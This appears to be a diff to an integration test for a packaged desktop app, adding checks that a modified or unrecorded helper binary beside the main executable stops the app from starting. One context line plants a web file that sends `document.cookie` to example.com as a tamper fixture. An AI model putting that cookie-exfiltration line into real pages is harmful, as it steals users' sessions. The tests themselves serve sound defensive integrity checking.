@@ -19,7 +19,10 @@ const results = [];
 const check = (n, ok, d = "") => (results.push(ok), console.log(`${ok ? "PASS" : "FAIL"}  ${n}${d ? "  " + d : ""}`));
 
 const enclaveHelper = join(repo, "target/debug/kaku-enclave");
-const pkg = await packageApp(join(work, "pkg"), { cookieEncryption: false, kaku: join(repo, "target/debug/kaku"), web: join(repo, "apps/web/dist"), enclave: existsSync(enclaveHelper) ? enclaveHelper : null });
+// the text recognition helper is bundled and the calendar reader is not, so both a changed helper and an unrecorded one can be tried
+const ocrHelper = join(repo, "target/debug/kaku-ocr");
+if (!existsSync(ocrHelper)) spawnSync("sh", [join(repo, "helpers/ocr/build.sh"), ocrHelper], { stdio: "ignore" });
+const pkg = await packageApp(join(work, "pkg"), { cookieEncryption: false, kaku: join(repo, "target/debug/kaku"), web: join(repo, "apps/web/dist"), enclave: existsSync(enclaveHelper) ? enclaveHelper : null , ocr: ocrHelper });
 check("the app is packaged as one asar with its integrity hash in Info.plist, and the load-only-from-asar and integrity fuses on", pkg.fuses["1"] === 48 && pkg.fuses["4"] === 49 && pkg.fuses["5"] === 49 && pkg.fuses["0"] === 48 && pkg.fuses["2"] === 48 && pkg.fuses["3"] === 48, JSON.stringify(pkg.fuses));
 
 // `bundled` starts the app the way an installed copy starts: no KAKU_BIN and no --ui-dir, so it runs what it carries.
@@ -126,6 +129,17 @@ writeFileSync(planted, "fetch('https://example.com/?' + document.cookie)");
 const changedWeb = await launchRefused("changed-web");
 check("hostile: a file added to the bundled web interface stops the app before the companion starts", !changedWeb.served && changedWeb.stderr.includes("web does not match bundle.json") && changedWeb.companionLine === "", changedWeb.stderr.trim().split("\n")[0]);
 rmSync(planted);
+check("kaku's text recognition helper sits beside it, recorded in the bundle", /^[0-9a-f]{64}$/.test(pkg.manifest.ocr ?? "") && existsSync(pkg.parts.ocr) && pkg.manifest.calendar === undefined, JSON.stringify(Object.keys(pkg.manifest)));
+const ocrBackup = join(work, "ocr.orig");
+copyFileSync(pkg.parts.ocr, ocrBackup);
+writeFileSync(pkg.parts.ocr, readFileSync(ocrBackup).subarray(0, statSync(ocrBackup).size - 1));
+const changedOcr = await launchRefused("changed-ocr");
+check("hostile: a changed helper beside kaku stops the app before kaku starts", !changedOcr.served && changedOcr.stderr.includes("ocr does not match bundle.json") && changedOcr.companionLine === "", changedOcr.stderr.trim().split("\n")[0]);
+copyFileSync(ocrBackup, pkg.parts.ocr);
+writeFileSync(pkg.parts.calendar, "#!/bin/sh\necho planted\n");
+const plantedHelper = await launchRefused("planted-helper");
+check("hostile: a helper packaging never recorded, planted beside kaku, stops the app before kaku starts", !plantedHelper.served && plantedHelper.stderr.includes("calendar does not match bundle.json") && plantedHelper.companionLine === "", plantedHelper.stderr.trim().split("\n")[0]);
+rmSync(pkg.parts.calendar);
 const devOverride = await launchGood("override");
 check("KAKU_BIN still points the packaged app at another kaku (for development)", devOverride.served && devOverride.companionLine.startsWith(join(repo, "target/debug/kaku") + " serve"), devOverride.companionLine.slice(0, 120));
 const restored2 = await launchGood("restored-parts", {}, { bundled: true });
